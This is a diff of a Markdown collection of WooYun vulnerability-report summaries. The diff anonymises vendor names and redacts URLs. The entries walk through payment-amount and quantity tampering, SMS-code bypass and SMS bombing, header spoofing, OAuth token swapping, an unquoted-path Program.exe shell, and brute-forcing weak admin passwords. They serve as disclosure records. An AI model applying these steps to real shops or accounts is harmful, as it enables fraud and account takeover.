+### [wooyun-2014-051449] RenderBus通过某电商平台充值存在汇率逻辑漏洞
 **厂商**: Renderbus云渲染农场 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 后台管理
@@ -4835,7 +4835,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: RenderBus 通过支付宝充值 RMB 为等数额 USD/GBP/EUR，比如 1RMB 充值后变成了 1USD。进入充值页，选择USD/GBP/EUR充值，输入金额，支付方式显示为空，直接不理会点充值按钮，好了你看支付宝说了1USD只要付1RMB就行。这是我支付宝交易成功的截图：你看后台里跟我说我账户充了1.06GBP和1USD。
+**详情**: RenderBus 通过某电商平台充值 RMB 为等数额 USD/GBP/EUR，比如 1RMB 充值后变成了 1USD。进入充值页，选择USD/GBP/EUR充值，输入金额，支付方式显示为空，直接不理会点充值按钮，好了你看某电商平台说了1USD只要付1RMB就行。这是我某电商平台交易成功的截图：你看后台里跟我说我账户充了1.06GBP和1USD。
 
 **POC**: (见原文)
 
@@ -4845,8 +4845,8 @@
 ---
 
 ---
-### [wooyun-2015-0104030] QQ轻聊版调用CreateProcess漏洞
-**厂商**: 腾讯 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2015-0104030] 某互联网公司轻聊版调用CreateProcess漏洞
+**厂商**: 某互联网公司 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 参数注入
 
@@ -4859,16 +4859,16 @@
 
 **详情**: 还是那个问题，createprocess的第一个参数设为NULL了，参数并没有做“”包含,导致精心放置在系统目录下的 “C:\Program.exe”被加载执行。
 
-**POC**: 1. 丢一个Program.exe到系统目录2. 启动QQ轻聊3. QQ启动，但是同时也后台加载了Program.exe4. Program.exe是个shell，开了个2345端口。目标机器信息5. telnet连它的2345端口6. 成功连上，随便看下系统信息
+**POC**: 1. 丢一个Program.exe到系统目录2. 启动某互联网公司轻聊3. 某互联网公司启动，但是同时也后台加载了Program.exe4. Program.exe是个shell，开了个2345端口。目标机器信息5. telnet连它的2345端口6. 成功连上，随便看下系统信息
 
 **绕过**: 直接利用
 
-**修复**: 乌云里有很多童靴都已经提过了，也都给了完善的修复指导，我就不重复了。MSDN：  https://msdn.microsoft.com/en-us/library/ms682425.aspx
+**修复**: 乌云里有很多童靴都已经提过了，也都给了完善的修复指导，我就不重复了。MSDN：  https://example.com/[已脱敏]
 ---
 
 ---
-### [wooyun-2014-050445] 腾讯QQ群共享病毒文件扫描绕过
-**厂商**: 腾讯 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2014-050445] 某互联网公司某互联网公司群共享病毒文件扫描绕过
+**厂商**: 某互联网公司 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 上传功能
 
@@ -4901,7 +4901,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 其实这是一类问题。app开发者为了开发方便，经常会把一些用来对敏感信息签名验证的私钥硬编码在客户端里。这样通过简单的逆向就能拿到这些私钥和签名算法，来伪造一些敏感的行为。这里以微票儿安卓客户端中的微信支付为例，展示下这种漏洞的危害。主要存在的问题是，在用微信支付时，订单信息由客户端生成，服务端并没有对支付的价格做验证，因此可以更改为任意价格，一分钱包场。下好订单后选微信支付，burp抓包。POST /pay/genprepay?access_token=yqaiSYReJm75yYPe18F3XFkYM47w95DSGYB1GiLwBRIWt-7JC0eUDV8turLu2eU6ZeqNohoTEwVphDNoNoc8ZNUuTpxUrmR2SPOJWYVTwxU HTTP/1.1Accept: application/jsonContent-type: application/jsonC
+**详情**: 其实这是一类问题。app开发者为了开发方便，经常会把一些用来对敏感信息签名验证的私钥硬编码在客户端里。这样通过简单的逆向就能拿到这些私钥和签名算法，来伪造一些敏感的行为。这里以微票儿安卓客户端中的某互联网公司支付为例，展示下这种漏洞的危害。主要存在的问题是，在用某互联网公司支付时，订单信息由客户端生成，服务端并没有对支付的价格做验证，因此可以更改为任意价格，一分钱包场。下好订单后选某互联网公司支付，burp抓包。POST /pay/genprepay?access_token=yqaiSYReJm75yYPe18F3XFkYM47w95DSGYB1GiLwBRIWt-7JC0eUDV8turLu2eU6ZeqNohoTEwVphDNoNoc8ZNUuTpxUrmR2SPOJWYVTwxU HTTP/1.1Accept: application/jsonContent-type: application/jsonC
 
 **POC**: 支付成功即可收到短信。
 
@@ -4911,8 +4911,8 @@
 ---
 
 ---
-### [wooyun-2015-0138173] 携程客户端升级存在安全隐患可被替换为木马
-**厂商**: 携程旅行网 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2015-0138173] 某旅游平台客户端升级存在安全隐患可被替换为木马
+**厂商**: 某旅游平台旅行网 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -4923,7 +4923,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1.携程客户端升级新版本的时候会进行MD5的校验，计算下载到本地的客户端的MD5数值以及服务端的返回的预期MD5数值是否匹配2.但是携程客户端所有的请求均是HTTP明文的，下面是请求md5值和新版本客户端下载链接的请求(1). 请求md5值和下载链接的url，经过验证该MD5确实是对应下载链接的APK的MD5(2). 下载APK应用的请求3.HTTP请求无任何签名和加密机制，非常容易进行篡改，利用中间人攻击可以同时对MD5和下载链接进行篡改，这样便可以绕过校验逻辑，这样便可以控制携程客户端可以安装任意的应用，包括木马病毒等恶意应用
+**详情**: 1.某旅游平台客户端升级新版本的时候会进行MD5的校验，计算下载到本地的客户端的MD5数值以及服务端的返回的预期MD5数值是否匹配2.但是某旅游平台客户端所有的请求均是HTTP明文的，下面是请求md5值和新版本客户端下载链接的请求(1). 请求md5值和下载链接的url，经过验证该MD5确实是对应下载链接的APK的MD5(2). 下载APK应用的请求3.HTTP请求无任何签名和加密机制，非常容易进行篡改，利用中间人攻击可以同时对MD5和下载链接进行篡改，这样便可以绕过校验逻辑，这样便可以控制某旅游平台客户端可以安装任意的应用，包括木马病毒等恶意应用
 
 **POC**: 具体的漏洞风险的原因都在截图中，如果需要的话我会做一个MITM的视频演示下，大家都是做安全的应该都明白这样风险有多大，否则客户端也没有必要进行md5的验证
 
@@ -4989,7 +4989,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 我们登录后选择一个进行支付：url:http://demo.cuumall.com/index.php/home/detail/index/id/360我们修改数量为负数，发现可以提交，改为-1，查看如图所示：有些时候会在后台进行二次校验，为了证明我们的猜想，我们一路确认下去，神奇的事情出现了这里我们选择，货到付款，然后查看，居然支付成功，我们回到自己的主页面查看信息如图所示：
+**详情**: 我们登录后选择一个进行支付：url:https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -5033,9 +5033,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1.应用介绍：e乐充公交卡是亿阳信通旗下子公司亿阳汇智通公司发布的中国首款NFC手机支付APP软件，集公交卡手机充值，余额查询，NFC支付功能为一身。支付宝钱包8.1.0.43001版本开始支持NFC为公交卡一卡通充值，其最终是调用e乐充公交卡应用，使用支付宝钱包来支付完成金额充值。e乐充公交卡作为支付宝的一个服务（独立的应用服务），在支付宝客户端上提供下载安装。测试版本：apk  : com.boco.alipay.activity, 8, 1.0.08, e乐充公交卡apkmd5: 96a320dd7f311b0fddd9b4223bd10012证书 :certmd5: d5eb2cba5245554667e2a38518a4e27dissuer: C=CH, ST=Beijing, L=Beijing, O=BOCO_HZT, OU=BOCO_HZT, CN=SJYKTsubject
+**详情**: 1.应用介绍：e乐充公交卡是亿阳信通旗下子公司亿阳汇智通公司发布的中国首款NFC手机支付APP软件，集公交卡手机充值，余额查询，NFC支付功能为一身。某电商平台钱包8.1.0.43001版本开始支持NFC为公交卡一卡通充值，其最终是调用e乐充公交卡应用，使用某电商平台钱包来支付完成金额充值。e乐充公交卡作为某电商平台的一个服务（独立的应用服务），在某电商平台客户端上提供下载安装。测试版本：apk  : com.boco.alipay.activity, 8, 1.0.08, e乐充公交卡apkmd5: 96a320dd7f311b0fddd9b4223bd10012证书 :certmd5: d5eb2cba5245554667e2a38518a4e27dissuer: C=CH, ST=Beijing, L=Beijing, O=BOCO_HZT, OU=BOCO_HZT, CN=SJYKTsubject
 
-**POC**: 3.漏洞利用：①获取第一次支付宝支付成功时Pay函数的返回值，这个可通过Hook来实现。②通过Hook Pay函数，修改Pay函数的返回值，使得在取消支付时Pay函数的返回值为第一次支付宝支付成功时Pay函数的返回值。③再次充值支付操作，在支付界面取消支付，撤销充值。截图如下：原始账户金额截图公交卡充值支付宝支付30元后账户余额截图Hook Pay函数后修改返回值，再次充值支付操作，但在支付界面取消支付：取消支付截图此时提示贴卡，进行数据读写，但贴卡后显示交易异常，此时点击撤销按钮：贴卡异常截图充值金额退回提示截图支付宝账单信息e乐公交卡充值记录e乐公交卡充退记录
+**POC**: 3.漏洞利用：①获取第一次某电商平台支付成功时Pay函数的返回值，这个可通过Hook来实现。②通过Hook Pay函数，修改Pay函数的返回值，使得在取消支付时Pay函数的返回值为第一次某电商平台支付成功时Pay函数的返回值。③再次充值支付操作，在支付界面取消支付，撤销充值。截图如下：原始账户金额截图公交卡充值某电商平台支付30元后账户余额截图Hook Pay函数后修改返回值，再次充值支付操作，但在支付界面取消支付：取消支付截图此时提示贴卡，进行数据读写，但贴卡后显示交易异常，此时点击撤销按钮：贴卡异常截图充值金额退回提示截图某电商平台账单信息e乐公交卡充值记录e乐公交卡充退记录
 
 **绕过**: 直接利用
 
@@ -5087,8 +5087,8 @@
 ---
 
 ---
-### [wooyun-2012-012189] 京东团购订单金额可在客户端修改并提交网银支付
-**厂商**: 京东商城 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误
+### [wooyun-2012-012189] 某电商平台团购订单金额可在客户端修改并提交网银支付
+**厂商**: 某电商平台商城 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -5109,8 +5109,8 @@
 ---
 
 ---
-### [wooyun-2014-053706] 百度招聘官网逻辑漏洞
-**厂商**: 百度 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误
+### [wooyun-2014-053706] 某搜索引擎招聘官网逻辑漏洞
+**厂商**: 某搜索引擎 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -5121,7 +5121,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 我本是一名大三狗！无奈大四要实习！于是向百度招聘投递简历！奈何投简历的时候没看清楚！本来打算投安全和PHP方向的！结果简历全投到了WEB前端！百度招聘对每个人简历投递的上限有要求！即为三封！超过三封就不能申请了！而且投递过的简历不能删除！这让我投错职位怎么办啊！于是就想办法进行绕过！下面进行详解！另求offer!我个人也参加了BCTF的！
+**详情**: 我本是一名大三狗！无奈大四要实习！于是向某搜索引擎招聘投递简历！奈何投简历的时候没看清楚！本来打算投安全和PHP方向的！结果简历全投到了WEB前端！某搜索引擎招聘对每个人简历投递的上限有要求！即为三封！超过三封就不能申请了！而且投递过的简历不能删除！这让我投错职位怎么办啊！于是就想办法进行绕过！下面进行详解！另求offer!我个人也参加了BCTF的！
 
 **POC**: (见原文)
 
@@ -5165,7 +5165,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 闲的没事，在网上看看有没有利群烟买。原来香烟不能再网上销售.无意间发现有个利群商城。没想到有支付漏洞。http://www.liqunshop.com/提交订单篡改金额 付款成功订单状态该公司确实是大的网上商城啊。有声有色的现金支付却是要注意安全啊。本流程只为安全测试。地址都为测试地址，表查我水表.
+**详情**: 闲的没事，在网上看看有没有利群烟买。原来香烟不能再网上销售.无意间发现有个利群商城。没想到有支付漏洞。https://example.com/[已脱敏] 付款成功订单状态该公司确实是大的网上商城啊。有声有色的现金支付却是要注意安全啊。本流程只为安全测试。地址都为测试地址，表查我水表.
 
 **POC**: (见原文)
 
@@ -5175,8 +5175,8 @@
 ---
 
 ---
-### [wooyun-2015-0165183] 中国移动某站设计逻辑缺陷漏洞一枚
-**厂商**: 中国移动 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误
+### [wooyun-2015-0165183] 某运营商某站设计逻辑缺陷漏洞一枚
+**厂商**: 某运营商 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 认证接口
 
@@ -5231,7 +5231,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 官网地址http://www.agehui.cn/长话短说先下一单，正常下单就可以来付款，意想不到的事情发现了
+**详情**: 官网地址https://example.com/[已脱敏]
 
 **POC**: order_id=38923&order_sn=20151111143930163754&order_amount=55挖洞不容易啊，给个首呗
 
@@ -5259,7 +5259,7 @@
 
 **绕过**: 过滤绕过
 
-**修复**: http://drops.wooyun.org/papers/4323 这里只讲了IPS的防护原理，修复我也不知道
+**修复**: https://example.com/[已脱敏] 这里只讲了IPS的防护原理，修复我也不知道
 ---
 
 ---
@@ -5277,7 +5277,7 @@
 
 **详情**: nanohttpd服务器在core/src/main/java/fi/iki/elonen/NanoHTTPD.java中，先将tcp包中的inetaddr地址取出放入headers['remote-hddr']中，再提取http请求中的header放入headers中，导致了remote-addr可被轻易覆盖nanohttpd经常嵌入在java程序中提供简易的http服务if (null != this.remoteIp) {this.headers.put("remote-addr", this.remoteIp);this.headers.put("http-client-ip", this.remoteIp);}//先提取出了tcp包中的remoteIp// Create a BufferedReader for parsing the header.BufferedReader 
 
-**POC**: 百度wormhole就用了这货，请求的时候加一个header   remote-addr: **.**.**.**就可以轻易绕过限制。你们都懂
+**POC**: 某搜索引擎wormhole就用了这货，请求的时候加一个header   remote-addr: **.**.**.**就可以轻易绕过限制。你们都懂
 
 **绕过**: 直接利用
 
@@ -5285,8 +5285,8 @@
 ---
 
 ---
-### [wooyun-2015-0158436] 中国移动河北某平台管理系统设计逻辑缺陷（人员信息定位）
-**厂商**: 中国移动 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误
+### [wooyun-2015-0158436] 某运营商河北某平台管理系统设计逻辑缺陷（人员信息定位）
+**厂商**: 某运营商 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -5319,7 +5319,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 蔚蓝团团购网站：http://tuan.wl.cn/选好团购商品，然后点击最下面的支付宝支付：抓包，并修改数量为-1：网站里出现未支付订单：直接点击付款，马上就跳转到显示付款成功的页面：账户余额增加了：使用该账户余额正常购买别的商品：利用余额支付成功：
+**详情**: 蔚蓝团团购网站：https://example.com/[已脱敏]
 
 **POC**: 证明如上～友情测试，请勿发货～
 
@@ -5363,7 +5363,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.x.com.cn/继续订单，这次不是桔币，而是物品的数量挑个贵的，再挑个便宜的。购物车里一起提交订单。burp抓包将贵的商品数量改为-1支付宝可支付订单查看，提交系统成功
+**详情**: https://example.com/[已脱敏]
 
 **POC**: 。。
 
@@ -5385,9 +5385,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: Wacom中国在线支付商城存在支付漏洞http://estore.wacom.com.cn
+**详情**: Wacom中国在线支付商城存在支付漏洞https://example.com/[已脱敏]
 
-**POC**: 1、首先我们去Wacom在线商城选几件商品加入购物车，然后我们直接点击减号是不可以减的，我们需要先加一个减号，然后再点击减号，我们发现，已经可以减了于是我就选了几件价格加吧加吧是正数，然后商品数量也为正的2、接下来我们提交~~3、支付，我们看看能不能通过支付宝4、我们发现是可以支付的啊！PS：其实我已经搭配出来了1块钱购物的组合…但是……但是……但是！邮费30~~~~~我实在是害怕我提交个漏洞，还得倒搭30RMB啊，不对！是31RMB！~。~  也不期待给礼物了，能确认就行~当然要是能给我个 数位板啥的 小弟也不介意的哈
+**POC**: 1、首先我们去Wacom在线商城选几件商品加入购物车，然后我们直接点击减号是不可以减的，我们需要先加一个减号，然后再点击减号，我们发现，已经可以减了于是我就选了几件价格加吧加吧是正数，然后商品数量也为正的2、接下来我们提交~~3、支付，我们看看能不能通过某电商平台4、我们发现是可以支付的啊！PS：其实我已经搭配出来了1块钱购物的组合…但是……但是……但是！邮费30~~~~~我实在是害怕我提交个漏洞，还得倒搭30RMB啊，不对！是31RMB！~。~  也不期待给礼物了，能确认就行~当然要是能给我个 数位板啥的 小弟也不介意的哈
 
 **绕过**: 直接利用
 
@@ -5429,7 +5429,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 正常登录易购，打开我的互联界面，选择登录模式为短信验证码，获取验证码。http://10035.suning.com/mysnnet/login.htm手机号码不是本人，点了验证码也没有用啊。没关系，我们重放一下发送验证码的post请求POST /myauth/checkMobile.htm HTTP/1.1Host: 10035.suning.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0Accept: */*Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencode
+**详情**: 正常登录易购，打开我的互联界面，选择登录模式为短信验证码，获取验证码。https://example.com/[已脱敏] /myauth/checkMobile.htm HTTP/1.1Host: 10035.suning.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0Accept: */*Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencode
 
 **POC**: 已经证明
 
@@ -5517,7 +5517,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1、找到酷我会员购买界面，使用微信支付方式2、正常情况下需要通过扫描微信的支付验证码，支付10元购买一个月会员3、0元购买时通过修改数据包的付费金额为0.01元，然后扫描微信支付成功后就可以成功成为会员了修改为0.01元继续操作支付请求变为0.01元了扫一下支付成功后重新登录查看
+**详情**: 1、找到酷我会员购买界面，使用某互联网公司支付方式2、正常情况下需要通过扫描某互联网公司的支付验证码，支付10元购买一个月会员3、0元购买时通过修改数据包的付费金额为0.01元，然后扫描某互联网公司支付成功后就可以成功成为会员了修改为0.01元继续操作支付请求变为0.01元了扫一下支付成功后重新登录查看
 
 **POC**: 1、0.01元购买了酷我会员2、银行扣款0.01元
 
@@ -5528,7 +5528,7 @@
 
 ---
 ### [wooyun-2012-012943] 购易网存在支付漏洞——0.1元购买任意商品
-**厂商**: http://www.gouyiwang.com(购易网) | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误
+**厂商**: https://example.com/[已脱敏]) | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -5605,7 +5605,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 首先进入 万网注册地址：http://www.net.cn/client/register?aid=register_index110421s然后随便填写以下第一页，点击进入下一步。然后上面输入你要攻击的号码，然后无限次的点击 免费获取短信验证码  。
+**详情**: 首先进入 万网注册地址：https://example.com/[已脱敏] 免费获取短信验证码  。
 
 **POC**: 你们可以自己测试的
 
@@ -5671,7 +5671,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 通过重置登陆密码，实现任意账号登陆重置密码过程中短信验证码在返回数据包中，不用手机就可以看到短信验证码，直接绕过短信验证http://www.kiford.com/forget另外，注册时发送手机验证码的返回数据包中也有短信验证码……
+**详情**: 通过重置登陆密码，实现任意账号登陆重置密码过程中短信验证码在返回数据包中，不用手机就可以看到短信验证码，直接绕过短信验证https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -5693,7 +5693,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 主站：http://www.seekfilm.com.cn直接贴图吧：买个电影票，然后用fiddler截取请求，修改参数，用支付宝支付。很简单的哦。
+**详情**: 主站：https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -5715,7 +5715,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 开始吧,进入官方商城进行购买随便买几个东西吧,恩。。就找奶粉吧http://cat.mamabb.com/我擦最贵的486  还真是贵。。我们多选几个吧不然等会不好加减、买多一点送@钱途、、我们先买478点击加入购物车抓包改包如图改为负数- -因为刚刚奶粉被抵消了、、这样的金额太小了不好找比他小2倍商品 我们换一个金额大一些的,买个床送给@钱途吧1000多块。。。我想只要支付就能买吧。。。嘿嘿。。
+**详情**: 开始吧,进入官方商城进行购买随便买几个东西吧,恩。。就找奶粉吧https://example.com/[已脱敏]  还真是贵。。我们多选几个吧不然等会不好加减、买多一点送@钱途、、我们先买478点击加入购物车抓包改包如图改为负数- -因为刚刚奶粉被抵消了、、这样的金额太小了不好找比他小2倍商品 我们换一个金额大一些的,买个床送给@钱途吧1000多块。。。我想只要支付就能买吧。。。嘿嘿。。
 
 **POC**: 我是来求礼物的
 
@@ -5725,8 +5725,8 @@
 ---
 
 ---
-### [wooyun-2014-071524] 百度某站存在支付漏洞（支付成功证明）
-**厂商**: 百度 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误
+### [wooyun-2014-071524] 某搜索引擎某站存在支付漏洞（支付成功证明）
+**厂商**: 某搜索引擎 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -5737,9 +5737,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 百度贴吧点击上图的领取超链接选择一个我选择贴吧小妞印记在贴吧收银台这个页面修改元素<div data-amount="3000" data-price="3000" data-id="tbxiaoniu" class="fn-YJ content">将3000修改为比较小的数选择一下数量然后支付支付成功话说这个贴吧印记是什么。。。
+**详情**: 某搜索引擎贴吧点击上图的领取超链接选择一个我选择贴吧小妞印记在贴吧收银台这个页面修改元素<div data-amount="3000" data-price="3000" data-id="tbxiaoniu" class="fn-YJ content">将3000修改为比较小的数选择一下数量然后支付支付成功话说这个贴吧印记是什么。。。
 
-**POC**: 百度贴吧点击上图的领取超链接选择一个我选择贴吧小妞印记在贴吧收银台这个页面修改元素<div data-amount="3000" data-price="3000" data-id="tbxiaoniu" class="fn-YJ content">将3000修改为比较小的数选择一下数量然后支付支付成功话说这个贴吧印记是什么。。。
+**POC**: 某搜索引擎贴吧点击上图的领取超链接选择一个我选择贴吧小妞印记在贴吧收银台这个页面修改元素<div data-amount="3000" data-price="3000" data-id="tbxiaoniu" class="fn-YJ content">将3000修改为比较小的数选择一下数量然后支付支付成功话说这个贴吧印记是什么。。。
 
 **绕过**: 直接利用
 
@@ -5769,8 +5769,8 @@
 ---
 
 ---
-### [wooyun-2015-096743] 支付宝新年红包单用户可多次刷
-**厂商**: 支付宝 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2015-096743] 某电商平台新年红包单用户可多次刷
+**厂商**: 某电商平台 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -5869,13 +5869,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 金山快盘手机客户端，在使用微博OAuth 2.0授权信息换取自己认证信息的过程中，一次性犯下两类常见的逻辑设计缺陷，导致可以任意进入他人快盘账号；但前提是，快盘帐号需要绑定微博。具体犯下的错误有：（问题一）OAuth 2.0无绑定token问题：由于OAuth 2.0的“无绑定token”特性（http://article.yeeyan.org/view/50978/307535 ），导致第三方应用在使用平台方的OAuth 2.0授权（authorize）作为自身应用的认证（authenticate）手段时，缺乏一种有效的认证传递校验和来源检查，从而导致只需要拥有B应用的access token，即可登录到A应用所绑定的服务中。此案例可见：WooYun: 啪啪任意进入他人账号（OAuth 2.0无绑定token问题）（问题二）使用错误的OAuth授权信息来用于认证交换：使用了uid来认证用
+**详情**: 金山快盘手机客户端，在使用某社交平台OAuth 2.0授权信息换取自己认证信息的过程中，一次性犯下两类常见的逻辑设计缺陷，导致可以任意进入他人快盘账号；但前提是，快盘帐号需要绑定某社交平台。具体犯下的错误有：（问题一）OAuth 2.0无绑定token问题：由于OAuth 2.0的“无绑定token”特性（https://example.com/[已脱敏] ），导致第三方应用在使用平台方的OAuth 2.0授权（authorize）作为自身应用的认证（authenticate）手段时，缺乏一种有效的认证传递校验和来源检查，从而导致只需要拥有B应用的access token，即可登录到A应用所绑定的服务中。此案例可见：WooYun: 啪啪任意进入他人账号（OAuth 2.0无绑定token问题）（问题二）使用错误的OAuth授权信息来用于认证交换：使用了uid来认证用
 
-**POC**: 问题一证明：OAuth 2.0无绑定token问题，通过拦截新浪微博返回的access token信息，修改成他人的access token和新浪uid，即可进入他人快盘。请注意，这个access token可以使用其它应用获取到的access token。修改难度中低，因为需要知道受害者在其它应用的access token。此时，一般需要诱骗受害者授权攻击者指定的应用，才可以完成攻击。（微博授权过程中，我使用了新浪uid 1780xxx登录；然后在下一步登录成功后截获，并将新浪uid 1780xxx在快盘获取的access token“2.00tRjxx”和uid“1780xxx”，替换成新
+**POC**: 问题一证明：OAuth 2.0无绑定token问题，通过拦截某社交平台某社交平台返回的access token信息，修改成他人的access token和某社交平台uid，即可进入他人快盘。请注意，这个access token可以使用其它应用获取到的access token。修改难度中低，因为需要知道受害者在其它应用的access token。此时，一般需要诱骗受害者授权攻击者指定的应用，才可以完成攻击。（某社交平台授权过程中，我使用了某社交平台uid 1780xxx登录；然后在下一步登录成功后截获，并将某社交平台uid 1780xxx在快盘获取的access token“2.00tRjxx”和uid“1780xxx”，替换成新
 
 **绕过**: 直接利用
 
-**修复**: 危害评定：就快盘而言，综合认定为“高”。原因如下：（1）问题一中，要获取用户的access token比较容易，只需要注册第三方应用并诱导用户授权即可。（2）问题二中，要获取用户的新浪uid极容易，只需要微博搜索即可获知。（3）定向攻击容易，只需要修改数据包；最终成功率极高，并且只要用户不修改密码，
+**修复**: 危害评定：就快盘而言，综合认定为“高”。原因如下：（1）问题一中，要获取用户的access token比较容易，只需要注册第三方应用并诱导用户授权即可。（2）问题二中，要获取用户的某社交平台uid极容易，只需要某社交平台搜索即可获知。（3）定向攻击容易，只需要修改数据包；最终成功率极高，并且只要用户不修改密码，
 ---
 
 ---
@@ -5913,7 +5913,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 51offer.com10元去留洋？问题处在mail.51offer.com的购买环节，刚开始测试时发现修改价格无效。然后测试在提交订单时替换订单号，用1900的订单号替换1700的，成功了，那么就意味着在最后的支付环节订单号和金额没有做验证，这是跳到支付宝付钱的最后一步。先看看1700的单：跳到支付宝时修改金额或者订单号随意：然后就上支付宝付钱，是真的付钱，不过我一毛钱都没，就不留洋了：
+**详情**: 51offer.com10元去留洋？问题处在mail.51offer.com的购买环节，刚开始测试时发现修改价格无效。然后测试在提交订单时替换订单号，用1900的订单号替换1700的，成功了，那么就意味着在最后的支付环节订单号和金额没有做验证，这是跳到某电商平台付钱的最后一步。先看看1700的单：跳到某电商平台时修改金额或者订单号随意：然后就上某电商平台付钱，是真的付钱，不过我一毛钱都没，就不留洋了：
 
 **POC**: (见原文)
 
@@ -5979,7 +5979,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 火星救援最近好火,我也要上火星种土豆,我要种土豆......... 于是在你们网站买电影票的时候,看了下你们主站没发现什么漏洞,然后google一下 你们公司发现了好几个后台管理地址然后找到这个后台http://om.wxmovie.com/顺便试了下 没发现有做登录限制,于是乎 爆破一组准备,123,123 爆破完毕 发现几个密码为123456的账号,随便登录几个看看 ,哟权限还不小,还可以赋权限...以下密码均为123456外加一个phpinfo 泄露http://ad.wxmovie.com/test1.php
+**详情**: 火星救援最近好火,我也要上火星种土豆,我要种土豆......... 于是在你们网站买电影票的时候,看了下你们主站没发现什么漏洞,然后google一下 你们公司发现了好几个后台管理地址然后找到这个后台https://example.com/[已脱敏] 没发现有做登录限制,于是乎 爆破一组准备,123,123 爆破完毕 发现几个密码为123456的账号,随便登录几个看看 ,哟权限还不小,还可以赋权限...以下密码均为123456外加一个phpinfo 泄露https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -6001,9 +6001,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 【支付漏洞】http://www.wefinder.com/支付过程中，盲目信任用户输入，导致金额可能被装篡改！以至于可能会使用极低金额甚至是1分钱支付..详见证明【商城用户地址遍历漏洞】http://www.fengbuy.com/提交订单转向支付平台时，会提交一个用户地址的ID，而这个ID并未对用户进行分辨，导致于可以使用任意id作为你的收货地址，然后用户的地址就这样泄漏了。详见证明
+**详情**: 【支付漏洞】https://example.com/[已脱敏]
 
-**POC**: 【支付漏洞】以家庭版永久为例，先提交订单确认并截包，我们可以发现payamount就是我们需要支付的金额，单位是元。我们将其改为0.01，也就是一分钱，提交到了支付平台，1分钱！！下面是支付.......然后就购买成功了【商城用户地址遍历漏洞】在提交订单的时候，有一个这样的请求。地址出现在http://www.fengbuy.com/checkout/onepage/saveOrder/这个billing_address_id就对应了我们的地址，我们可以将其随便改...就可以用别人的地址下订单了~~同时，用户额地址也就泄漏了！
+**POC**: 【支付漏洞】以家庭版永久为例，先提交订单确认并截包，我们可以发现payamount就是我们需要支付的金额，单位是元。我们将其改为0.01，也就是一分钱，提交到了支付平台，1分钱！！下面是支付.......然后就购买成功了【商城用户地址遍历漏洞】在提交订单的时候，有一个这样的请求。地址出现在https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -6025,7 +6025,7 @@
 
